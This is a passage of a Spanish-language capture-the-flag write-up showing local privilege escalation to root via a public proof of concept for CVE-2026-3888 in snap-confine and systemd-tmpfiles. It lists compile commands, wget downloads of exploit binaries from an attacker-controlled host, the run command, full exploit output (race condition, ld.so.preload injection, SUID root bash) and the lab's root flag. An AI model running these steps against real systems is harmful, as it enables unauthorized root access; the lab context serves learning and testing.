URL = [PoC CVE-2026-3888 GitHub](https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE/tree/main)

Este exploit abusa de una combinación de:

* `snap-confine` (SUID)
* `systemd-tmpfiles`
* Manipulación de namespaces
* Condiciones de carrera (_race condition_)

El repositorio incluye múltiples implementaciones. En nuestro caso, utilizaremos la variante basada en **capabilities**, que resulta más fiable que otras aproximaciones basadas únicamente en SUID.

### Preparación del exploit

Clonamos el repositorio en nuestra máquina atacante:

```shell
git clone https://github.com/TheCyberGeek/CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE.git
cd CVE-2026-3888-snap-confine-systemd-tmpfiles-LPE/
```

A continuación, compilamos los binarios necesarios:

```shell
gcc -O2 -static -o exploit_caps exploit_caps.c
gcc -shared -fPIC -nostartfiles -o librootshell_caps.so librootshell_caps.c
```

En este caso, únicamente necesitamos estos dos archivos, que son los que han funcionado correctamente durante la explotación.

### Transferencia a la máquina víctima

Levantamos un servidor HTTP simple:

```shell
python3 -m http.server 80
```

Desde la máquina víctima, descargamos los binarios:

```shell
cd /tmp
wget http://<IP_ATTACKER>/exploit_caps
wget http://<IP_ATTACKER>/librootshell_caps.so
```

Asignamos permisos de ejecución:

```shell
chmod +x exploit_caps librootshell_caps.so
```

### Ejecución del exploit

Ejecutamos el exploit de la siguiente forma:

```shell
./exploit_caps ./librootshell_caps.so
```

> ⚠️ **Nota importante:** Este exploit depende de una **race condition**, por lo que su ejecución no es determinista. Puede requerir múltiples intentos hasta conseguir una ejecución exitosa. En este caso, fue necesario aproximadamente **1 hora** hasta lograr explotarlo correctamente.

### Resultado de la explotación

Salida relevante del exploit:

```
================================================================
CVE-2026-3888 — snap-confine / systemd-tmpfiles Capabilities LPE 
================================================================
[*] Payload: /tmp/./librootshell_caps.so (14320 bytes)

[Phase 1] Entering snap-store sandbox...
[+] Inner shell PID: 7341

[Phase 2] Waiting for .snap deletion...
[+] .snap already gone!

[Phase 3] Destroying cached mount namespace...
cannot perform operation: mount --rbind /dev /tmp/snap.rootfs_qsSAx8//dev: No such file or directory
[+] Namespace destroyed (.mnt gone).

[Phase 4] Setting up and running the race...
[*]   Working directory: /proc/7341/cwd
[*]   Building .snap and .exchange...
[*]   17 entries copied to exchange directory
[*]   Starting race...
[*]   Monitoring snap-confine (child PID 7360)...

[!]   TRIGGER — swapping directories...
[+]   SWAP DONE — race won!
[+]   Race won. /var/lib/snapd is now user-owned.

[Phase 5] Setting up payload and user-fstab...
[*]   Copying /etc to .snap/etc...
[*]   Writing ld.so.preload...
[*]   Writing user-fstab...
[*]   Copying librootshell.so to /tmp/...
[*]   Copying busybox...
[*]   Writing escape script...
[*]   Swapping var/lib back (restoring original snapd metadata)...
[+]   Payload ready.

[Phase 6] Triggering root via SUID binary in /tmp/.snap...
[*]   Executing: snap-confine → /tmp/.snap/var/lib/snapd/hostfs/snap/core22/current/usr/bin/su
[*]   Exit status: 0

[Phase 7] Verifying...
[+] SUID root bash: /var/snap/snap-store/common/bash (mode 4755)
[*] Cleaning up background processes...

================================================================
  ROOT SHELL: /var/snap/snap-store/common/bash -p
================================================================

bash-5.1# whoami
root
```

Durante la explotación, el ataque consigue:

* Ganar la condición de carrera (_race condition_)
* Obtener control sobre rutas críticas de `snapd`
* Inyectar un payload mediante `ld.so.preload`
* Generar una **bash con permisos SUID root**
* Ejecuta la shell generada como `root`

Tras una exitosa explotación, obtenemos una `shell` como el usuario `root`, por lo que ya podremos leer la `flag` del usuario `root`.

> root.txt

```
31c1a2fdaf850e55c14fda22cb1fb2c3
```
